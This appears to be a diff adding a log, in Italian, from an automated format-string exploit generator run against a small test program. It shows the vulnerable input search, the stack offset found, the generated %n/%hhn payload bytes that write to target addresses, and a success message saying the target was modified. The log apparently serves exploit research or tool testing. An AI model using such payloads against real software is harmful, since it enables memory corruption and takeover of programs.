@@ -1,0 +1,25 @@
+Dimensione indirizzi: 8 byte
+Endian: little
+
+Input da linea di comando: []
+Input da passare durante l'esecuzione: [{'type': 'execution_input', 'marker': None, 'value': 'PPPP', 'free': True}]
+
+
+Inizio ricerca di input vulnerabili
+
+Input in test: {'type': 'execution_input', 'marker': None, 'value': 'PPPP', 'free': True}
+Input libero, verifica se exploitabile: input exploitabile
+Verifica stampa della dimensione minima della stringa di exploit (58 caratteri): dimensione minima stampata
+Definizione marcati per estrarre fmt nella risposta: yv, jg
+Conteggio della dimensione effettiva dell'input (fino a 562 caratteri): 122 caratteri disponibili + 4 caratteri usati dai marcatori
+Ricerca fmt su stack: posizione 6
+Generazione fmt per exploit nel formato 'scrittori-indirizzi': generazione completata con successo
+La stringa generata è: 
+		b'%11$n%255x%12$hhn%13$hhn%14$hhn%15$hhn..L\x10`\x00\x00\x00\x00\x00H\x10`\x00\x00\x00\x00\x00I\x10`\x00\x00\x00\x00\x00J\x10`\x00\x00\x00\x00\x00K\x10`\x00\x00\x00\x00\x00'
+Inizio exploit: La risposta è:
+----------------------------------------
+Tell me a story and then I'll tell you one >> Here's a story - 
+                                                                                                                                                                                                                                                         602260..L`
+Target modified correctly!
+
+----------------------------------------
